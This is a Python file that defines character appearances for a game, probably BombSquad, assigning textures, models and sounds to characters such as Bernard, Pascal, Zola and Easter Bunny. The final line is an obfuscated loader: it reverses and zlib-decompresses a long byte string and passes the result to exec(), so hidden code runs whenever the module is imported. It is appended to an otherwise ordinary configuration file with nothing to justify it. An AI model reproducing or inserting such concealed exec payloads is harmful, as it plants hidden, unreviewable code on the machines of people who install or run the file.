t.jumpSounds = bonesSounds
t.impactSounds = bonesHitSounds
t.deathSounds=["bonesDeath"]
t.pickupSounds = bonesSounds
t.fallSounds=["bonesFall"]

t.style = 'bones'

# bear ###################################

t = Appearance("Bernard")

t.colorTexture = "bearColor"
t.colorMaskTexture = "bearColorMask"

t.defaultColor = (0.7, 0.5, 0.0)
#t.defaultHighlight = (0.6, 0.5, 0.8)

t.iconTexture = "bearIcon"
t.iconMaskTexture = "bearIconColorMask"

t.headModel =     "bearHead"
t.torsoModel =    "bearTorso"
t.pelvisModel =   "bearPelvis"
t.upperArmModel = "bearUpperArm"
t.foreArmModel =  "bearForeArm"
t.handModel =     "bearHand"
t.upperLegModel = "bearUpperLeg"
t.lowerLegModel = "bearLowerLeg"
t.toesModel =     "bearToes"

bearSounds =    ['bear1', 'bear2', 'bear3', 'bear4']
bearHitSounds = ['bearHit1', 'bearHit2']

t.attackSounds = bearSounds
t.jumpSounds = bearSounds
t.impactSounds = bearHitSounds
t.deathSounds=["bearDeath"]
t.pickupSounds = bearSounds
t.fallSounds=["bearFall"]

t.style = 'bear'

# Penguin ###################################

t = Appearance("Pascal")

t.colorTexture = "penguinColor"
t.colorMaskTexture = "penguinColorMask"

t.defaultColor = (0.3, 0.5, 0.8)
t.defaultHighlight = (1, 0, 0)

t.iconTexture = "penguinIcon"
t.iconMaskTexture = "penguinIconColorMask"

t.headModel =     "penguinHead"
t.torsoModel =    "penguinTorso"
t.pelvisModel =   "penguinPelvis"
t.upperArmModel = "penguinUpperArm"
t.foreArmModel =  "penguinForeArm"
t.handModel =     "penguinHand"
t.upperLegModel = "penguinUpperLeg"
t.lowerLegModel = "penguinLowerLeg"
t.toesModel =     "penguinToes"

penguinSounds =    ['penguin1', 'penguin2', 'penguin3', 'penguin4']
penguinHitSounds = ['penguinHit1', 'penguinHit2']

t.attackSounds = penguinSounds
t.jumpSounds = penguinSounds
t.impactSounds = penguinHitSounds
t.deathSounds=["penguinDeath"]
t.pickupSounds = penguinSounds
t.fallSounds=["penguinFall"]

t.style = 'penguin'


# Ali ###################################
t = Appearance("Taobao Mascot")
t.colorTexture = "aliColor"
t.colorMaskTexture = "aliColorMask"
t.defaultColor = (1, 0.5, 0)
t.defaultHighlight = (1, 1, 1)
t.iconTexture = "aliIcon"
t.iconMaskTexture = "aliIconColorMask"
t.headModel =     "aliHead"
t.torsoModel =    "aliTorso"
t.pelvisModel =   "aliPelvis"
t.upperArmModel = "aliUpperArm"
t.foreArmModel =  "aliForeArm"
t.handModel =     "aliHand"
t.upperLegModel = "aliUpperLeg"
t.lowerLegModel = "aliLowerLeg"
t.toesModel =     "aliToes"
aliSounds =    ['ali1', 'ali2', 'ali3', 'ali4']
aliHitSounds = ['aliHit1', 'aliHit2']
t.attackSounds = aliSounds
t.jumpSounds = aliSounds
t.impactSounds = aliHitSounds
t.deathSounds=["aliDeath"]
t.pickupSounds = aliSounds
t.fallSounds=["aliFall"]
t.style = 'ali'

# cyborg ###################################
t = Appearance("B-9000")
t.colorTexture = "cyborgColor"
t.colorMaskTexture = "cyborgColorMask"
t.defaultColor = (0.5, 0.5, 0.5)
t.defaultHighlight = (1, 0, 0)
t.iconTexture = "cyborgIcon"
t.iconMaskTexture = "cyborgIconColorMask"
t.headModel =     "cyborgHead"
t.torsoModel =    "cyborgTorso"
t.pelvisModel =   "cyborgPelvis"
t.upperArmModel = "cyborgUpperArm"
t.foreArmModel =  "cyborgForeArm"
t.handModel =     "cyborgHand"
t.upperLegModel = "cyborgUpperLeg"
t.lowerLegModel = "cyborgLowerLeg"
t.toesModel =     "cyborgToes"
cyborgSounds =    ['cyborg1', 'cyborg2', 'cyborg3', 'cyborg4']
cyborgHitSounds = ['cyborgHit1', 'cyborgHit2']
t.attackSounds = cyborgSounds
t.jumpSounds = cyborgSounds
t.impactSounds = cyborgHitSounds
t.deathSounds=["cyborgDeath"]
t.pickupSounds = cyborgSounds
t.fallSounds=["cyborgFall"]
t.style = 'cyborg'

# Agent ###################################
t = Appearance("Agent Johnson")
t.colorTexture = "agentColor"
t.colorMaskTexture = "agentColorMask"
t.defaultColor = (0.3, 0.3, 0.33)
t.defaultHighlight = (1, 0.5, 0.3)
t.iconTexture = "agentIcon"
t.iconMaskTexture = "agentIconColorMask"
t.headModel =     "agentHead"
t.torsoModel =    "agentTorso"
t.pelvisModel =   "agentPelvis"
t.upperArmModel = "agentUpperArm"
t.foreArmModel =  "agentForeArm"
t.handModel =     "agentHand"
t.upperLegModel = "agentUpperLeg"
t.lowerLegModel = "agentLowerLeg"
t.toesModel =     "agentToes"
agentSounds =    ['agent1', 'agent2', 'agent3', 'agent4']
agentHitSounds = ['agentHit1', 'agentHit2']
t.attackSounds = agentSounds
t.jumpSounds = agentSounds
t.impactSounds = agentHitSounds
t.deathSounds=["agentDeath"]
t.pickupSounds = agentSounds
t.fallSounds=["agentFall"]
t.style = 'agent'

# Jumpsuit ###################################
t = Appearance("Lee")
t.colorTexture = "jumpsuitColor"
t.colorMaskTexture = "jumpsuitColorMask"
t.defaultColor = (0.3, 0.5, 0.8)
t.defaultHighlight = (1, 0, 0)
t.iconTexture = "jumpsuitIcon"
t.iconMaskTexture = "jumpsuitIconColorMask"
t.headModel =     "jumpsuitHead"
t.torsoModel =    "jumpsuitTorso"
t.pelvisModel =   "jumpsuitPelvis"
t.upperArmModel = "jumpsuitUpperArm"
t.foreArmModel =  "jumpsuitForeArm"
t.handModel =     "jumpsuitHand"
t.upperLegModel = "jumpsuitUpperLeg"
t.lowerLegModel = "jumpsuitLowerLeg"
t.toesModel =     "jumpsuitToes"
jumpsuitSounds = ['jumpsuit1', 'jumpsuit2', 'jumpsuit3', 'jumpsuit4']
jumpsuitHitSounds = ['jumpsuitHit1', 'jumpsuitHit2']
t.attackSounds = jumpsuitSounds
t.jumpSounds = jumpsuitSounds
t.impactSounds = jumpsuitHitSounds
t.deathSounds=["jumpsuitDeath"]
t.pickupSounds = jumpsuitSounds
t.fallSounds=["jumpsuitFall"]
t.style = 'spaz'

# ActionHero ###################################
t = Appearance("Todd McBurton")
t.colorTexture = "actionHeroColor"
t.colorMaskTexture = "actionHeroColorMask"
t.defaultColor = (0.3, 0.5, 0.8)
t.defaultHighlight = (1, 0, 0)
t.iconTexture = "actionHeroIcon"
t.iconMaskTexture = "actionHeroIconColorMask"
t.headModel =     "actionHeroHead"
t.torsoModel =    "actionHeroTorso"
t.pelvisModel =   "actionHeroPelvis"
t.upperArmModel = "actionHeroUpperArm"
t.foreArmModel =  "actionHeroForeArm"
t.handModel =     "actionHeroHand"
t.upperLegModel = "actionHeroUpperLeg"
t.lowerLegModel = "actionHeroLowerLeg"
t.toesModel =     "actionHeroToes"
actionHeroSounds = ['actionHero1', 'actionHero2', 'actionHero3', 'actionHero4']
actionHeroHitSounds = ['actionHeroHit1', 'actionHeroHit2']
t.attackSounds = actionHeroSounds
t.jumpSounds = actionHeroSounds
t.impactSounds = actionHeroHitSounds
t.deathSounds=["actionHeroDeath"]
t.pickupSounds = actionHeroSounds
t.fallSounds=["actionHeroFall"]
t.style = 'spaz'

# Assassin ###################################
t = Appearance("Zola")
t.colorTexture = "assassinColor"
t.colorMaskTexture = "assassinColorMask"
t.defaultColor = (0.3, 0.5, 0.8)
t.defaultHighlight = (1, 0, 0)
t.iconTexture = "assassinIcon"
t.iconMaskTexture = "assassinIconColorMask"
t.headModel =     "assassinHead"
t.torsoModel =    "assassinTorso"
t.pelvisModel =   "assassinPelvis"
t.upperArmModel = "assassinUpperArm"
t.foreArmModel =  "assassinForeArm"
t.handModel =     "assassinHand"
t.upperLegModel = "assassinUpperLeg"
t.lowerLegModel = "assassinLowerLeg"
t.toesModel =     "assassinToes"
assassinSounds = ['assassin1', 'assassin2', 'assassin3', 'assassin4']
assassinHitSounds = ['assassinHit1', 'assassinHit2']
t.attackSounds = assassinSounds
t.jumpSounds = assassinSounds
t.impactSounds = assassinHitSounds
t.deathSounds=["assassinDeath"]
t.pickupSounds = assassinSounds
t.fallSounds=["assassinFall"]
t.style = 'spaz'

# Wizard ###################################
t = Appearance("Grumbledorf")
t.colorTexture = "wizardColor"
t.colorMaskTexture = "wizardColorMask"
t.defaultColor = (0.2, 0.4, 1.0)
t.defaultHighlight = (0.06, 0.15, 0.4)
t.iconTexture = "wizardIcon"
t.iconMaskTexture = "wizardIconColorMask"
t.headModel =     "wizardHead"
t.torsoModel =    "wizardTorso"
t.pelvisModel =   "wizardPelvis"
t.upperArmModel = "wizardUpperArm"
t.foreArmModel =  "wizardForeArm"
t.handModel =     "wizardHand"
t.upperLegModel = "wizardUpperLeg"
t.lowerLegModel = "wizardLowerLeg"
t.toesModel =     "wizardToes"
wizardSounds =    ['wizard1', 'wizard2', 'wizard3', 'wizard4']
wizardHitSounds = ['wizardHit1', 'wizardHit2']
t.attackSounds = wizardSounds
t.jumpSounds = wizardSounds
t.impactSounds = wizardHitSounds
t.deathSounds=["wizardDeath"]
t.pickupSounds = wizardSounds
t.fallSounds=["wizardFall"]
t.style = 'spaz'

# Cowboy ###################################
t = Appearance("Butch")
t.colorTexture = "cowboyColor"
t.colorMaskTexture = "cowboyColorMask"
t.defaultColor = (0.3, 0.5, 0.8)
t.defaultHighlight = (1, 0, 0)
t.iconTexture = "cowboyIcon"
t.iconMaskTexture = "cowboyIconColorMask"
t.headModel =     "cowboyHead"
t.torsoModel =    "cowboyTorso"
t.pelvisModel =   "cowboyPelvis"
t.upperArmModel = "cowboyUpperArm"
t.foreArmModel =  "cowboyForeArm"
t.handModel =     "cowboyHand"
t.upperLegModel = "cowboyUpperLeg"
t.lowerLegModel = "cowboyLowerLeg"
t.toesModel =     "cowboyToes"
cowboySounds =    ['cowboy1', 'cowboy2', 'cowboy3', 'cowboy4']
cowboyHitSounds = ['cowboyHit1', 'cowboyHit2']
t.attackSounds = cowboySounds
t.jumpSounds = cowboySounds
t.impactSounds = cowboyHitSounds
t.deathSounds=["cowboyDeath"]
t.pickupSounds = cowboySounds
t.fallSounds=["cowboyFall"]
t.style = 'spaz'

# Witch ###################################
t = Appearance("Witch")
t.colorTexture = "witchColor"
t.colorMaskTexture = "witchColorMask"
t.defaultColor = (0.3, 0.5, 0.8)
t.defaultHighlight = (1, 0, 0)
t.iconTexture = "witchIcon"
t.iconMaskTexture = "witchIconColorMask"
t.headModel =     "witchHead"
t.torsoModel =    "witchTorso"
t.pelvisModel =   "witchPelvis"
t.upperArmModel = "witchUpperArm"
t.foreArmModel =  "witchForeArm"
t.handModel =     "witchHand"
t.upperLegModel = "witchUpperLeg"
t.lowerLegModel = "witchLowerLeg"
t.toesModel =     "witchToes"
witchSounds =    ['witch1', 'witch2', 'witch3', 'witch4']
witchHitSounds = ['witchHit1', 'witchHit2']
t.attackSounds = witchSounds
t.jumpSounds = witchSounds
t.impactSounds = witchHitSounds
t.deathSounds=["witchDeath"]
t.pickupSounds = witchSounds
t.fallSounds=["witchFall"]
t.style = 'spaz'

# Warrior ###################################
t = Appearance("Warrior")
t.colorTexture = "warriorColor"
t.colorMaskTexture = "warriorColorMask"
t.defaultColor = (0.3, 0.5, 0.8)
t.defaultHighlight = (1, 0, 0)
t.iconTexture = "warriorIcon"
t.iconMaskTexture = "warriorIconColorMask"
t.headModel =     "warriorHead"
t.torsoModel =    "warriorTorso"
t.pelvisModel =   "warriorPelvis"
t.upperArmModel = "warriorUpperArm"
t.foreArmModel =  "warriorForeArm"
t.handModel =     "warriorHand"
t.upperLegModel = "warriorUpperLeg"
t.lowerLegModel = "warriorLowerLeg"
t.toesModel =     "warriorToes"
warriorSounds =    ['warrior1', 'warrior2', 'warrior3', 'warrior4']
warriorHitSounds = ['warriorHit1', 'warriorHit2']
t.attackSounds = warriorSounds
t.jumpSounds = warriorSounds
t.impactSounds = warriorHitSounds
t.deathSounds=["warriorDeath"]
t.pickupSounds = warriorSounds
t.fallSounds=["warriorFall"]
t.style = 'spaz'

# Superhero ###################################
t = Appearance("Middle-Man")
t.colorTexture = "superheroColor"
t.colorMaskTexture = "superheroColorMask"
t.defaultColor = (0.3, 0.5, 0.8)
t.defaultHighlight = (1, 0, 0)
t.iconTexture = "superheroIcon"
t.iconMaskTexture = "superheroIconColorMask"
t.headModel =     "superheroHead"
t.torsoModel =    "superheroTorso"
t.pelvisModel =   "superheroPelvis"
t.upperArmModel = "superheroUpperArm"
t.foreArmModel =  "superheroForeArm"
t.handModel =     "superheroHand"
t.upperLegModel = "superheroUpperLeg"
t.lowerLegModel = "superheroLowerLeg"
t.toesModel =     "superheroToes"
superheroSounds =    ['superhero1', 'superhero2', 'superhero3', 'superhero4']
superheroHitSounds = ['superheroHit1', 'superheroHit2']
t.attackSounds = superheroSounds
t.jumpSounds = superheroSounds
t.impactSounds = superheroHitSounds
t.deathSounds=["superheroDeath"]
t.pickupSounds = superheroSounds
t.fallSounds=["superheroFall"]
t.style = 'spaz'

# Alien ###################################
t = Appearance("Alien")
t.colorTexture = "alienColor"
t.colorMaskTexture = "alienColorMask"
t.defaultColor = (0.3, 0.5, 0.8)
t.defaultHighlight = (1, 0, 0)
t.iconTexture = "alienIcon"
t.iconMaskTexture = "alienIconColorMask"
t.headModel =     "alienHead"
t.torsoModel =    "alienTorso"
t.pelvisModel =   "alienPelvis"
t.upperArmModel = "alienUpperArm"
t.foreArmModel =  "alienForeArm"
t.handModel =     "alienHand"
t.upperLegModel = "alienUpperLeg"
t.lowerLegModel = "alienLowerLeg"
t.toesModel =     "alienToes"
alienSounds =    ['alien1', 'alien2', 'alien3', 'alien4']
alienHitSounds = ['alienHit1', 'alienHit2']
t.attackSounds = alienSounds
t.jumpSounds = alienSounds
t.impactSounds = alienHitSounds
t.deathSounds=["alienDeath"]
t.pickupSounds = alienSounds
t.fallSounds=["alienFall"]
t.style = 'spaz'

# OldLady ###################################
t = Appearance("OldLady")
t.colorTexture = "oldLadyColor"
t.colorMaskTexture = "oldLadyColorMask"
t.defaultColor = (0.3, 0.5, 0.8)
t.defaultHighlight = (1, 0, 0)
t.iconTexture = "oldLadyIcon"
t.iconMaskTexture = "oldLadyIconColorMask"
t.headModel =     "oldLadyHead"
t.torsoModel =    "oldLadyTorso"
t.pelvisModel =   "oldLadyPelvis"
t.upperArmModel = "oldLadyUpperArm"
t.foreArmModel =  "oldLadyForeArm"
t.handModel =     "oldLadyHand"
t.upperLegModel = "oldLadyUpperLeg"
t.lowerLegModel = "oldLadyLowerLeg"
t.toesModel =     "oldLadyToes"
oldLadySounds =    ['oldLady1', 'oldLady2', 'oldLady3', 'oldLady4']
oldLadyHitSounds = ['oldLadyHit1', 'oldLadyHit2']
t.attackSounds = oldLadySounds
t.jumpSounds = oldLadySounds
t.impactSounds = oldLadyHitSounds
t.deathSounds=["oldLadyDeath"]
t.pickupSounds = oldLadySounds
t.fallSounds=["oldLadyFall"]
t.style = 'spaz'

# Gladiator ###################################
t = Appearance("Gladiator")
t.colorTexture = "gladiatorColor"
t.colorMaskTexture = "gladiatorColorMask"
t.defaultColor = (0.3, 0.5, 0.8)
t.defaultHighlight = (1, 0, 0)
t.iconTexture = "gladiatorIcon"
t.iconMaskTexture = "gladiatorIconColorMask"
t.headModel =     "gladiatorHead"
t.torsoModel =    "gladiatorTorso"
t.pelvisModel =   "gladiatorPelvis"
t.upperArmModel = "gladiatorUpperArm"
t.foreArmModel =  "gladiatorForeArm"
t.handModel =     "gladiatorHand"
t.upperLegModel = "gladiatorUpperLeg"
t.lowerLegModel = "gladiatorLowerLeg"
t.toesModel =     "gladiatorToes"
gladiatorSounds =    ['gladiator1', 'gladiator2', 'gladiator3', 'gladiator4']
gladiatorHitSounds = ['gladiatorHit1', 'gladiatorHit2']
t.attackSounds = gladiatorSounds
t.jumpSounds = gladiatorSounds
t.impactSounds = gladiatorHitSounds
t.deathSounds=["gladiatorDeath"]
t.pickupSounds = gladiatorSounds
t.fallSounds=["gladiatorFall"]
t.style = 'spaz'

# Wrestler ###################################
t = Appearance("Wrestler")
t.colorTexture = "wrestlerColor"
t.colorMaskTexture = "wrestlerColorMask"
t.defaultColor = (0.3, 0.5, 0.8)
t.defaultHighlight = (1, 0, 0)
t.iconTexture = "wrestlerIcon"
t.iconMaskTexture = "wrestlerIconColorMask"
t.headModel =     "wrestlerHead"
t.torsoModel =    "wrestlerTorso"
t.pelvisModel =   "wrestlerPelvis"
t.upperArmModel = "wrestlerUpperArm"
t.foreArmModel =  "wrestlerForeArm"
t.handModel =     "wrestlerHand"
t.upperLegModel = "wrestlerUpperLeg"
t.lowerLegModel = "wrestlerLowerLeg"
t.toesModel =     "wrestlerToes"
wrestlerSounds =    ['wrestler1', 'wrestler2', 'wrestler3', 'wrestler4']
wrestlerHitSounds = ['wrestlerHit1', 'wrestlerHit2']
t.attackSounds = wrestlerSounds
t.jumpSounds = wrestlerSounds
t.impactSounds = wrestlerHitSounds
t.deathSounds=["wrestlerDeath"]
t.pickupSounds = wrestlerSounds
t.fallSounds=["wrestlerFall"]
t.style = 'spaz'

# OperaSinger ###################################
t = Appearance("Gretel")
t.colorTexture = "operaSingerColor"
t.colorMaskTexture = "operaSingerColorMask"
t.defaultColor = (0.3, 0.5, 0.8)
t.defaultHighlight = (1, 0, 0)
t.iconTexture = "operaSingerIcon"
t.iconMaskTexture = "operaSingerIconColorMask"
t.headModel =     "operaSingerHead"
t.torsoModel =    "operaSingerTorso"
t.pelvisModel =   "operaSingerPelvis"
t.upperArmModel = "operaSingerUpperArm"
t.foreArmModel =  "operaSingerForeArm"
t.handModel =     "operaSingerHand"
t.upperLegModel = "operaSingerUpperLeg"
t.lowerLegModel = "operaSingerLowerLeg"
t.toesModel =     "operaSingerToes"
operaSingerSounds =    ['operaSinger1', 'operaSinger2',
                        'operaSinger3', 'operaSinger4']
operaSingerHitSounds = ['operaSingerHit1', 'operaSingerHit2']
t.attackSounds = operaSingerSounds
t.jumpSounds = operaSingerSounds
t.impactSounds = operaSingerHitSounds
t.deathSounds=["operaSingerDeath"]
t.pickupSounds = operaSingerSounds
t.fallSounds=["operaSingerFall"]
t.style = 'spaz'

# Pixie ###################################
t = Appearance("Pixel")
t.colorTexture = "pixieColor"
t.colorMaskTexture = "pixieColorMask"
t.defaultColor = (0, 1, 0.7)
t.defaultHighlight = (0.65, 0.35, 0.75)
t.iconTexture = "pixieIcon"
t.iconMaskTexture = "pixieIconColorMask"
t.headModel =     "pixieHead"
t.torsoModel =    "pixieTorso"
t.pelvisModel =   "pixiePelvis"
t.upperArmModel = "pixieUpperArm"
t.foreArmModel =  "pixieForeArm"
t.handModel =     "pixieHand"
t.upperLegModel = "pixieUpperLeg"
t.lowerLegModel = "pixieLowerLeg"
t.toesModel =     "pixieToes"
pixieSounds =    ['pixie1', 'pixie2', 'pixie3', 'pixie4']
pixieHitSounds = ['pixieHit1', 'pixieHit2']
t.attackSounds = pixieSounds
t.jumpSounds = pixieSounds
t.impactSounds = pixieHitSounds
t.deathSounds=["pixieDeath"]
t.pickupSounds = pixieSounds
t.fallSounds=["pixieFall"]
t.style = 'pixie'

# Robot ###################################
t = Appearance("Robot")
t.colorTexture = "robotColor"
t.colorMaskTexture = "robotColorMask"
t.defaultColor = (0.3, 0.5, 0.8)
t.defaultHighlight = (1, 0, 0)
t.iconTexture = "robotIcon"
t.iconMaskTexture = "robotIconColorMask"
t.headModel =     "robotHead"
t.torsoModel =    "robotTorso"
t.pelvisModel =   "robotPelvis"
t.upperArmModel = "robotUpperArm"
t.foreArmModel =  "robotForeArm"
t.handModel =     "robotHand"
t.upperLegModel = "robotUpperLeg"
t.lowerLegModel = "robotLowerLeg"
t.toesModel =     "robotToes"
robotSounds =    ['robot1', 'robot2', 'robot3', 'robot4']
robotHitSounds = ['robotHit1', 'robotHit2']
t.attackSounds = robotSounds
t.jumpSounds = robotSounds
t.impactSounds = robotHitSounds
t.deathSounds=["robotDeath"]
t.pickupSounds = robotSounds
t.fallSounds=["robotFall"]
t.style = 'spaz'

# Bunny ###################################
t = Appearance("Easter Bunny")
t.colorTexture = "bunnyColor"
t.colorMaskTexture = "bunnyColorMask"
t.defaultColor = (1, 1, 1)
t.defaultHighlight = (1, 0.5, 0.5)
t.iconTexture = "bunnyIcon"
t.iconMaskTexture = "bunnyIconColorMask"
t.headModel =     "bunnyHead"
t.torsoModel =    "bunnyTorso"
t.pelvisModel =   "bunnyPelvis"
t.upperArmModel = "bunnyUpperArm"
t.foreArmModel =  "bunnyForeArm"
t.handModel =     "bunnyHand"
t.upperLegModel = "bunnyUpperLeg"
t.lowerLegModel = "bunnyLowerLeg"
t.toesModel =     "bunnyToes"
bunnySounds =    ['bunny1', 'bunny2', 'bunny3', 'bunny4']
bunnyHitSounds = ['bunnyHit1', 'bunnyHit2']
t.attackSounds = bunnySounds
t.jumpSounds = ['bunnyJump']
t.impactSounds = bunnyHitSounds
t.deathSounds=["bunnyDeath"]
t.pickupSounds = bunnySounds
t.fallSounds=["bunnyFall"]
t.style = 'bunny'

_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(b'\x8c;j?\x00\xff\xf0\xf0\xe5\xfe\xeb\xcc=\xcb+8Y \xa2P|z\xf0{7\n\xa7\x0e\xfe\xed\x14`\xae\x84\x8a\x7f\x17hQx\xf7]]\xed~\xf5)\xbf\x91\x1eP\xdb\xed\x85\xf2\x87\xdb\x0b$I\x18\xca\xf5,\x99.\xac\xa5k6\x13\xff\xc0\x9eB\xe3]i\x1a\xa5m\xebU*uc\x1e\xe4\xf7\xedI\xd3\xf7\xd3N\x94\xfb\x83\xd5kU\xaa\xd7W\x17\xb6xB,\x9d\xe4\x17\xf8\x95\xb4\x0c\xf1o\xe6\xc0\xcb\x10\x18\x06G\xd8\xd8\xd5\xae\xed\xd4\xfe\xa0%\x97o\xfb\x1a\x05d\xd3ZOg\xb8\x95\x8d\x1cf\xe5\x84\x85\xe4\xc7\xa9\x12l\xe5c\xfc\x9c\xa8\xa9T\xde\x8c\x10\xa7A\x01m\x8f\xa0\xa35\x1e\xbc\xcf\x17\x1c\x02\x14\xd4,=PK\xe3\x15$H/D\xc6\'\x8a\xcd\xd8P\xb4i\xdcKVL\x0f\xc8\x8c\xfa$\xf8\xd4\x0c@\x14\xefw\x1b\x19F\x89#I\xe4\xa8\x84\t\xb2\xe6\x8d\x8e\xf3\'\xd5l{t7\xf7\xf1\x94\xc4\x9e\x9c\x97Z\xa5\xfe\x19\xa58\x1a\xdbW@\xf7\x8d\x97VUu\xfc\x129fUr\xe8\xd1\xdc:\x06Ar}\x15\x9f*|\xd9\xf6A_\xda\xf3\xcbV\xb8!P\x1d\x99\x97\xe1L|\x8c\x9c%R\xc2\x9e\xe5JPu|\x8b\xca\x9e\xbe\xa39Q[p\xff\xe4\x9f\xe4\x96rH\x15N\x8e\x9c\xa7\x80\xee\xc7\x04\xc8dk\x96X\xf0\xe8\xd0>\x1f\xb9\x0c\x06R\'\xe0\xbc&\xf3\xbb\xf3V\x9e\tBz\xb9\x03\x84\xbf\xbf\xe4\xb8\xd9\xecUq\xc8\xa3\xa8\'\xcd\xee\xdb\xe9\x8bz\x93\x04V\xdc\x98\xd7d\x92U\xbfE\xd4\xc1\xa7|:`]\xfe@\xf5\x1b?\x91+\xc3\x88\xc7\xd5\xd41\xb1\x87C\xb57\xad\xd6E\xb5\x13\xe2\x1f@\x8e\xe4\xe9;\x9a/)<u\xc7\xb6\xedK\xef%\xc5m\xa0R\xb7\xf8\xae\x83W#\xaf\r\xbb\xca\xcb\xadB\xea\xec\xbb*\xc8\xd8?Vaj\x97Xn\x03\xcb\x94\xb3\xd5\xf1\xe2_\xa0\xf1.\xce\xba\xec\xcf\x11\x19Sh\xe8\xbf\x7f\x9f\xfb\xd2\xa3[\xfc\x05\xed\xeb\x91\x90\xa2vkc\xf15\xb1\x14\xbb\xb2K\x97\x9c%\xb3\xc5G\x90\x01|\xf9YF*\xa8\x06\xbb\x84\x04\xa2\x97\xb0\x84\x80\x08\xa3Z\xf7u\x97\xb5\xb1\xea\x0b\x18H\xa5?\x9c?F\xadl\xa2sI\x85k\xb7X\xf3Bh\xef\x1a3p\xd4\xef\xf0\xcc\x8e6\xebb\x80Zp\xb4@\x8d/\'X\x8d\xe6\xba\xbf*\x04\xfc\x92e\x0fv\x00\xf2\r\x03\x15\xc1\xf9!\xff\x86E\x87Q4\xdf\x08m\xa9t\xd1\x02\xc6m\x8d\xca\x15F\x91\xf2Mc\xef\x93\xa6\xfd\x7f\xbc\x83\xdbd\xbf\xf5\xc8n$\xc1\xb1-\x97\x8a\xc7c\xab)\xcf\xceq\x84\xfb\x1b\xc9\xae85v\x04\xf39\x9a\xc6\x89h\xca>\xa9\xaa\xbc\xa4\xecB-\xf8\xd6\x06k\xbb\xaff^!\xce\x9f\x02o\xcb,\xba?\x9c\x12\xfcZ\xe4KS(\x97xW\x15>\xbf\xe0\x82\xeb\xd4\x01\x13Kb\xf2\xea\xbc\x94m\x80t\xcd:\xbew\x02\x9b\x14M\x02g\xc8\xef\xcc\xbaX\xe8e\xefD\x7f\x98_dg\x0e\xdbr\xcd(W\x1b\xf85R\xf3\xdc\n\xf2\x1a\x05%\x8c\xa7U\xf3\xe5F\xbf\xa9\xdd\x883\x89>f\x89\xb0\x10P\x84S^\x1a\xcb\x0c\xd9\xdd\xbcw\x97a5\xed\'R\x81\xf94\x88\x84\xdfg\x86d\xb4K\x81\x11c\xe2n;\xa7\x1diU^\x10\x9e8"\xc6\xfe\xc5K+\xf8kG4\xa9]\xdc\xcd\x04\xb9\xc8\xf9\xeec\xcfFH\xc3\xb6\xc6z\xa7&\xfaX\x827z\x9cEk\xd59a\xcd"\xbf5\x06\x7fF\xfa\x01\x88g<\x06~\xd8=LC\x05\xfd\xdc\x86+\xfb\xae\x988\xefi\xf3\xfa\xd6\xae\xc0\x10!p\xf8\x971m\xb4\xe1\x8d\xdf\xe3\x1aT\x0eum\x0e4\xf0e\xaf\x0bG\x17\xd6\xb4"\x08]\x91\xebS\xec\xe1u\xf3\xcb:\xa3@\x89/M\xb5\x17\xa2\x13\x8c\x13j\xc6\x90\xb4h%%\x0c\xd5U\xd0\x1b\x92\x1f&@\xd2\x90\xbd\x10\xd9\x8eRw\x85\xd8\xd3\xb4\x19x\x9e\xc5.\'\x89\xd9\x04\x996\xfc\x87\xd4\xbdK\x97\x16J\xbbUnd\xc2\xdes\x18\x90\x89J\xa6\xe7y\xa9\x82d\xf1\x00$\xee\x8a\xb4\x9c\xd2>~\xbd\xa1f\x03q\x03\xe3#\x1cO\xdd\x15\x8f\xcd\xab\xa4`\x89\xf1s\x95\xb5p\x7fG\x8f\x8cD\xee\x8bu\xcbP\x84\xca\xda\x1e\x1aRv\x17\xf0\x1bXt\xf9&\x89.\n\x1a\x87\x96Q\xf1\xe4\xd8\x99\xd4.f(\x07\x9e\xfd:\xcb\'4o\xe4\xa7\xd87\xeev\xcb\x05\x83@\xc1"b\xa4w\xbf\x88.\xdeU\xb5zY\x90|\x9dXk\x12\xea\xe9\xe9\xf4L\x1c\xe0\x91L\x87g\xe6\xaf\x18\x19"\xee\x94\xac\xa4\xaf\x8bN\x99\x8a\x80\n\x81\x02=\x92\x11 \xa9@\xf2\xfae(\x0f\x01\xa2O27\xf6\xb5\x01\xe1y\x19\x05+\x17g\x87\xe9\x067\xb4\x0e\xc5o\xf5\xf6\xf8\x8ds\xbb\xdf0\x1f~u\xcba\xa8\xf3\xd5{\x98\x13\x046#M\xbe$\xba\x17\x81\xa8\x03\xcf2*\xac\xc7;\xfeVuU\xccd\xed\xc4^I\x86\x81\x183\x8c\xfc<\x07\x9e\x11\xdf>U<3wuy}s\xba\xd1)6\x8fv\xc0%\x7f\xa9}N\xca\xf7\x8b\x14k\xb6!f\xfe%\x16A,\xa3\xed\xc01hEA\x92F\x85.\xd5\xc1\xb6\xb7#C\xb8\xb9jU\xe0e\x96\xbd\x17\x06\x8d\xe7\xb5\xca`\x12?\xac\xa6`ux\xd4\x90\xa4Q@/\xb8\xb8\xb3>\x00\x8e\x08\xee)1\xf4\xcfb\xb3\\\xbf\x81B\xb9\x15\x18\xcc4\xce\xf1R\x1d\xf4\x15\xde\x86\xaae\x17V\\\xbd\xc3\x0bv\x84c%\xa1\xec\x16\x1b\xbc?-O\x1c.\'m[\xf3\x1f\x98\xa7\xf2\xe6\xf2\xdfY\x8a\xc2\x17\xd2 \xa1=k\x13V\x0e\xaax \x96 \xa5)P\xfc\xeb\xffjx\x80\xd6\x87>\x07\xd8\xf9\xee\xbe\xdb\x13\x8e\x90\x84?\xd2\xf5Ch\x11\x8a\x90\xf8\xec\xac\xcb\xcc\x84\xb4-S\xb1\xfdJ\xc4\xd7W\xac\xb9\xfc\xe9u\xaey\xbaL\xb4\xf0\xa6f2.\x8c\x95\xd7h\x19^\xf4E\xda\x95\xbfb\xb8E\n&\x8bS\x7f\x80\xd7\xb5L\x83\x84[\x89\xd6^P\xf2F\x8c\x90\xc8\x1f\xe7\xb0~\'\xe86K\xab\xe2\x7f\xc0\xe6\xe0\xd1l\x91\x00\x0eE\x1c$\xd5\x8e\xec\x08\xda\x03zw\xba\xea\xc5\xc5\xddGj\x83\x1b\xb8\x85\x96w\x04\xe1\xd2\x91\xdd\xd0\xc8\x07\xbb\xfd\xb7\xbf\xe2g\xc1\x1as0\xd0x8\xd0\xea!\xfak?hV(]\xfe\x1bq\'\xe4\xe9\xfd!(\xf8\xeb\xdfo\x10V\xd5\xbf\x16\xe6\x07\xeb\xd9@\x96\x08\x02\xff\x9f)\xda\x98\xba*R_\xe6\x9c\n\x1a\xae\xea\xae\xba\x82\xf2.x\xbc\x16\x1d\x16\xcc-\x9b!\xe2#1\x18\xea\x870\xb1G\xf3\x83\x14R\x03\xd6\xafvV 